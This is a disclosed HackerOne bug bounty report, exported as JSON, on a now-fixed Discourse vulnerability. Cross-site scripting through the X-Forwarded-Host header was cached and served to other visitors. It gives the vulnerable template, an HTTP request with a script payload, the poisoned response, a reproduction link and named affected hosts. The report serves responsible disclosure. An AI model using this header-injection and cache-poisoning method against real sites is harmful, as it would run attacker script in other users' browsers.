{"id":394016,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zOTQwMTY=","url":"https://hackerone.com/reports/394016","title":"Web Cache Deception Attack (XSS)","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2018-08-13T06:04:57.161Z","submitted_at":"2018-08-13T06:04:57.161Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"bobrov","url":"/bobrov","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":16893,"url":"https://hackerone.com/discourse","handle":"discourse","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/016/893/0bc08a2076b0f1f4a2c58636b8171b32cc367a52_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/893/0bc08a2076b0f1f4a2c58636b8171b32cc367a52_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Discourse","twitter_handle":"discourse","website":"https://discourse.org","about":"Discourse is JavaScript (ember.js) and Ruby on Rails based 100% open source discussion software -- https://github.com/discourse/discourse"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2018-11-18T07:09:41.188Z","bug_reporter_agreed_on_going_public_at":"2018-10-19T07:09:36.947Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"This XSS does not affect the try.discourse.org, but worked on many other Discourse instances, that i tested. In discussions with the Mozilla team, we came to the conclusion that this is a vulnerability in the Discourse and it needs to be sent through this program.\nList of vulnerable hosts:\n```\ndiscourse.mozilla.org\nforum.learning.mozilla.org\nforum.glasswire.com\nhelp.nextcloud.com\nmeta.discourse.org\n```\n\nDescription XSS\n===\nThe Web application is vulnerable to XSS through the X-Forwarded-Host header. \n\n**Vulnerable code**\nhttps://github.com/discourse/discourse/blob/master/app/views/common/_special_font_face.html.erb#L12-L18\n```\n\u003c% woff2_url = \"#{asset_path(\"fontawesome-webfont.woff2\")}?#{font_domain}\u0026v=4.7.0\".html_safe %\u003e\n\n\u003clink rel=\"preload\" href=\"\u003c%=woff2_url%\u003e\" as=\"font\" type=\"font/woff2\" crossorigin /\u003e\n...\n    src: url('\u003c%=woff2_url %\u003e') format('woff2'),\n```\n\n\n\n\n**HTTP Request**\n```http\nGET /?xx HTTP/1.1\nHost: meta.discourse.org\nX-Forwarded-Host: cacheattack'\"\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e\n```\n\n**HTTP Response**\n```html\n\u003clink rel=\"preload\" \n   href=\"https://d11a6trkgmumsb.cloudfront.net/assets/fontawesome-webfont-2adefcbc041e7d18fcf2d417879dc5a09997aa64d675b7a3c4b6ce33da13f3fe.woff2?https://cacheattack'\"\u003e\n   \u003cscript\u003ealert(document.domain)\u003c/script\u003e\n   \u00262\u0026v=4.7.0\" as=\"font\" type=\"font/woff2\" crossorigin /\u003e\n\u003cstyle\u003e\n  @font-face {\n    font-family: 'FontAwesome';\n    src: url('https://d11a6trkgmumsb.cloudfront.net/assets/fontawesome-webfont-2adefcbc041e7d18fcf2d417879dc5a09997aa64d675b7a3c4b6ce33da13f3fe.woff2?https://cacheattack'\"\u003e\n    \u003cscript\u003ealert(document.domain)\u003c/script\u003e\n    \u00262\u0026v=4.7.0') format('woff2'),\n         url('https://d11a6trkgmumsb.cloudfront.net/assets/fontawesome-webfont-ba0c59deb5450f5cb41b3f93609ee2d0d995415877ddfa223e8a8a7533474f07.woff?https://cacheattack\u0026#39;\u0026quot;\u0026gt;\u0026lt;script\u0026gt;alert(document.domain)\u0026lt;/script\u0026gt;\u0026amp;2\u0026v=4.7.0') format('woff');\n  }\n\u003c/style\u003e\n```\n\nWeb Cache Deception\n===\nAlso, the application caches the HTTP response for 1 minute, so if you send an HTTP request with XSS payload, it will be cached and will be displayed for all requests when the headers match:\nRequest Start Line, Accept, Accept-Encoding.\n\n**Steps To Reproduce**\nFor a simpler demonstration, I wrote a script.\nThe script takes the necessary headers from the request and poisons the cache.\nYou just need to open the cached page.\n\n1) Open URL\n```\nhttps://blackfan.ru/bugbounty/webcachedeception.php?url=https://meta.discourse.org/?cacheattack\u0026payload=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E\u0026cache=60\n```\n2) Open the cached URL that the script displays.\n\n3) Result\n\n{F332797}\n\n## Impact\n\nAttacker can collect the popular combinations of Accep + Accept-Encoding and poison the cache of the web pages every minute.\nThe impact is like a stored XSS on any page.","bounty_amount":"256.0","formatted_bounty":"$256","weakness":{"id":62,"name":"Cross-site Scripting (XSS) - Stored"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":332797,"file_name":"Screenshot_at_10-00-49.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/332/797/86697ee9723c903d3698983fe2aaf4ef47183b0e/Screenshot_at_10-00-49.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_at_10-00-49.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_at_10-00-49.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQTXACUYF6%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T145520Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDZ4o5FgQbPOV7cUhasXsMpsRhfie%2BaT3j2%2FpT4vRtXrQIhANTpo%2FcLyZWkchHfmQUF52JZTNkTQv76yqIpKiufRkzIKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgxBFvChFQcfy0iFfX8q1wNyqcNfKQ7lbPM93GK7zsCVuFEl%2FVm4iCcIyQUbJFWfH2jiZwLWzXyXOGtPdAFg6jZ27A3JiIMI2cRQ0ZjefpX23ew4f2EgNrAjI%2BtoD%2F5QRlfpZWkH6iJZQB6Tl2elKHpLsozAmLMg2ZCF27az6tPlE5SwA3JPC5KKlDjsViNs2UljZCi3H9uSwsukoU%2FvdCWTH%2Fn50kTwo3bwe%2FH3PWsruJkAQ7DX1%2Fj9brsxUqDkLoqtLrdoJjkKc0QIPiVbiif2roLjf%2B%2BMNUUjLjPZ27VJBWMgYN3p%2FXN%2Fc2BT1VqWpZMMYQ84FXmc9pAGYMt40reW%2BOqOJwy98WVa3ZnRts3MNHsi7yiH6arhodeoIERCyyc0BhhJEItkxN5Wzyg1DrlhRUS1Y71%2FbjrEz4uBhQSkdwrt3ERf6rlWOARG2SfQdqloTHaxYeaKlkA1gYk2lr8P8v4Z2wcf76dl0kv5neqxZuEP1QXm7QMG6m4bxy4%2BSeNKsdU%2FVA5yixjEwa92C8A1VyBQrxcJgjfs7VfF2qV2iBmnh%2FB2iQg07zl1YJd0cPNun9USqJb8Uqe%2B27IwrOZbWtmOWnBh1TcvDRMDsM%2FPcb7c4FlLVjUX8TDrhUH4Hz0mpfpQPYswtoqRiwY6pAGpulV8rT1rLL2zo7CLXj%2FCsA9YXTe8QLCuwj5BAVEq1XkBbMgCpFE7wCWHjGb7zRvhVV%2BN69FRCvvxudtZT7OkdQfTd7cCnr7vVLgwdFxyTBTiSFdPhCB%2F%2BGa%2FZGSO8Tzmn%2F5kYwNrvNcaCO%2FfxLRKT5QyWFtCeJZaDCV4pXJgLvMY0o61KPcMitqxyN7tABkO5sZ5lEaE04FUiiZgi%2BMqeSxyhg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=3b32073408bdc32d2a87c9852b6b2fb51f3e88b1a61158b1485f66784df37125","file_size":9357,"type":"image/png"}],"allow_singular_disclosure_at":"2018-11-18T07:09:36.976Z","allow_singular_disclosure_after":-91439143.1664648,"singular_disclosure_allowed":true,"vote_count":33,"voters":["sourc7","bobrov","base_64","ras-it","sameerphad72","spam404","s_p_q_r","ali","ms-13","eveeez","and 23 more..."],"severity":{"rating":"high","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":3189139,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks, this was indeed some old code from 2013 in the font header that should have been removed. Good find, though we believe it is difficult to exploit, and mostly 'affects' anons who have no credentials to steal.","automated_response":false,"created_at":"2018-08-13T21:27:18.244Z","updated_at":"2018-08-13T21:27:18.244Z","actor":{"username":"discourse_team","cleared":false,"url":"/discourse_team","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/130/970/7a0cbe82b76df13bcdbf07365f42abe856650525_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"bobrov","url":"/bobrov"},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3189141,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2018-08-13T21:27:41.395Z","updated_at":"2018-08-13T21:27:41.395Z","actor":{"url":"/discourse","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/893/0bc08a2076b0f1f4a2c58636b8171b32cc367a52_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Discourse"}},"bounty_amount":"256.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"discourse","collaborator":{"username":"bobrov","url":"/bobrov"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3501601,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2018-10-19T07:09:36.961Z","updated_at":"2018-10-19T07:09:36.961Z","first_to_agree":true,"actor":{"username":"bobrov","cleared":false,"url":"/bobrov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3674088,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2018-11-18T07:09:41.201Z","updated_at":"2018-11-18T07:09:41.201Z","actor":{"url":"/discourse","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/893/0bc08a2076b0f1f4a2c58636b8171b32cc367a52_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Discourse"}},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":11850,"category":"researcher","content":"* Web Cache Poisoning\n===","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":2205,"username":"bobrov","name":"Sergey Bobrov","bio":"@Black2Fan","cleared":false,"website":"https://twitter.com/Black2Fan","location":"Russia","created_at":"2014-01-14T04:31:42.053Z","url":"https://hackerone.com/bobrov","anc_triager":false,"hackerone_triager":false,"hackerone_employee":false,"user_type":"hacker","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/c11036e2d3f8b05af4b5da5984ccdec6f786b763c8abceb4e68042e10dcdae85"}}}]}